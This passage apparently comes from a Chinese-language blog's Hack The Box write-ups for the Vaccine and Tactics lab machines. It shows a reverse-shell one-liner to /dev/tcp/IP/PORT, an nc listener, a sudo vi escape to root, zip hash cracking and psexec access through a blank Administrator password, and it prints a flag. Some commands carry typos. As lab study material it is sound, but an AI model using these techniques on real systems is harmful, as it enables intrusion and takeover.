<h6 id="九、RootFlag"><a href="#九、RootFlag" class="headerlink" title="九、RootFlag"></a>九、RootFlag</h6><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">从GitHub下载python脚本</span></span><br><span class="line">https://github.com/florianges/-HTB-Vaccine_sql_injection</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">复制nc.traditional文件到桌面，修改文件名为nc</span></span><br><span class="line">cp /bin/nc.traditional /home/Desktop/nc</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">开启python的web服务</span></span><br><span class="line">python3 -m http.server 80</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">修改sql_injection脚本，并开启nc监听</span></span><br><span class="line">nc -lvvp 4444</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">执行python脚本，获取shell（接收后不会弹出任何内容，直接执行命令即可）</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用如下命令提升为ttyshell</span></span><br><span class="line">SHELL=/bin/bash script -q /dev/null</span><br><span class="line">python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看/var/www/html/dashboard.php文件，获取postgresql用户密码</span></span><br><span class="line">cat /var/www/html/dashboard.php</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">执行sudo -l，查看命令权限。输入刚才获取的密码</span></span><br><span class="line">sudo -l</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">编辑/pg_hba.conf文件</span></span><br><span class="line">sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">写入提权命令，回车</span></span><br><span class="line">:!/bin/bash</span><br><span class="line">whoami</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">find寻找root.txt文件</span></span><br><span class="line">find / type f -name root.txt 2&gt;dev/null</span><br><span class="line">cat /root/roo.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/03/15/tdNITmk73lAF4Sj.png" alt="image-20230222172322409"></p>
<p><img src="https://s2.loli.net/2023/03/15/Xg14BVmCLWuo5Hs.png" alt="image-20230222172338416"></p>
<p><img src="https://s2.loli.net/2023/03/15/O3QyERKnWmSUJig.png" alt="image-20230222172522096"></p>
<p><img src="https://s2.loli.net/2023/03/15/9lHpFg5xtrX2LUq.png" alt="image-20230222173052225"></p>
<p><img src="https://s2.loli.net/2023/03/15/pHAPnOlmILU6QJE.png" alt="image-20230223111734986"></p>
<p><img src="https://s2.loli.net/2023/03/15/degQvGHFfmPybzn.png" alt="image-20230223111812736"></p>
<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><ul>
<li><p>John工具破解加密zip</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">生成<span class="built_in">hash</span>文件</span></span><br><span class="line">zip2john xxx.zip &gt;&gt; passwd.hash</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">破解<span class="built_in">hash</span></span></span><br><span class="line">jhon passwd.hash</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">显示密码</span></span><br><span class="line">jhon passwd.hash --show</span><br></pre></td></tr></table></figure>
</li>
<li><p>反弹shell</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bash -c &#x27;bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1&#x27;</span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
        <category>HTB</category>
      </categories>
      <tags>
        <tag>HTB</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Hactics</title>
    <url>/2023/07/06/HTB-Tactics/</url>
    <content><![CDATA[<h5 id="一、当我们的-ping-ICMP-数据包被-Windows-防火墙阻止时，我们可以使用哪个-Nmap-参数来枚举机器？"><a href="#一、当我们的-ping-ICMP-数据包被-Windows-防火墙阻止时，我们可以使用哪个-Nmap-参数来枚举机器？" class="headerlink" title="一、当我们的 ping ICMP 数据包被 Windows 防火墙阻止时，我们可以使用哪个 Nmap 参数来枚举机器？"></a>一、当我们的 ping ICMP 数据包被 Windows 防火墙阻止时，我们可以使用哪个 Nmap 参数来枚举机器？</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-PN</span><br></pre></td></tr></table></figure>

<h5 id="二、3-个字母的首字母缩略词-SMB-代表什么？"><a href="#二、3-个字母的首字母缩略词-SMB-代表什么？" class="headerlink" title="二、3 个字母的首字母缩略词 SMB 代表什么？"></a>二、3 个字母的首字母缩略词 SMB 代表什么？</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server message block</span><br></pre></td></tr></table></figure>

<h5 id="三、SMB-使用哪个端口进行操作？"><a href="#三、SMB-使用哪个端口进行操作？" class="headerlink" title="三、SMB 使用哪个端口进行操作？"></a>三、SMB 使用哪个端口进行操作？</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">445</span><br></pre></td></tr></table></figure>

<h5 id="四、你给“smbclient”什么命令行参数来列出可用的共享？"><a href="#四、你给“smbclient”什么命令行参数来列出可用的共享？" class="headerlink" title="四、你给“smbclient”什么命令行参数来列出可用的共享？"></a>四、你给“smbclient”什么命令行参数来列出可用的共享？</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-L</span><br></pre></td></tr></table></figure>

<h5 id="五、共享名称末尾的哪个字符表示它是管理共享？"><a href="#五、共享名称末尾的哪个字符表示它是管理共享？" class="headerlink" title="五、共享名称末尾的哪个字符表示它是管理共享？"></a>五、共享名称末尾的哪个字符表示它是管理共享？</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$</span><br></pre></td></tr></table></figure>

<h5 id="六、访问哪个管理共享允许用户查看整个文件系统？"><a href="#六、访问哪个管理共享允许用户查看整个文件系统？" class="headerlink" title="六、访问哪个管理共享允许用户查看整个文件系统？"></a>六、访问哪个管理共享允许用户查看整个文件系统？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用smbclient连接</span></span><br><span class="line">smbclient -IL IP --user=Administrator</span><br><span class="line"><span class="meta prompt_">c$</span></span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/03/16/I32liUpDoRaK1Zm.png" alt="image-20230315171412294"></p>
<h5 id="七、我们可以使用什么命令来下载我们在-SMB-共享上找到的文件？"><a href="#七、我们可以使用什么命令来下载我们在-SMB-共享上找到的文件？" class="headerlink" title="七、我们可以使用什么命令来下载我们在 SMB 共享上找到的文件？"></a>七、我们可以使用什么命令来下载我们在 SMB 共享上找到的文件？</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">get</span><br></pre></td></tr></table></figure>

<h5 id="八、Impacket-集合中的哪个工具可用于获取系统上的交互式-shell？"><a href="#八、Impacket-集合中的哪个工具可用于获取系统上的交互式-shell？" class="headerlink" title="八、Impacket 集合中的哪个工具可用于获取系统上的交互式 shell？"></a>八、Impacket 集合中的哪个工具可用于获取系统上的交互式 shell？</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">psexec.py</span><br></pre></td></tr></table></figure>

<h5 id="九、提交flag"><a href="#九、提交flag" class="headerlink" title="九、提交flag"></a>九、提交flag</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用smbclient或者impacket-psexec连接靶机</span></span><br><span class="line">smbclient //IP -U Administrator </span><br><span class="line">impacket-psexec &quot;./Administrator:&quot;@IP</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">flag文件在C:\Users\Administrator\Desktop\</span></span><br><span class="line"><span class="language-bash">f751c19eda8f61ce81827e6930a1f40c</span></span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/03/16/4iFJtBlCAQLSjhE.png" alt="image-20230316102048729"></p>
<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><ul>
<li><p>SMB弱密码</p>
</li>
<li><p>smbclient工具使用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">smbclient //IP -U username</span><br></pre></td></tr></table></figure>


</li>
<li><p>impacket-psexec工具使用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">impacket-psexec &quot;./username:&quot;@IP</span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
        <category>HTB</category>
      </categories>
      <tags>
        <tag>HTB</tag>
      </tags>
  </entry>
</search>
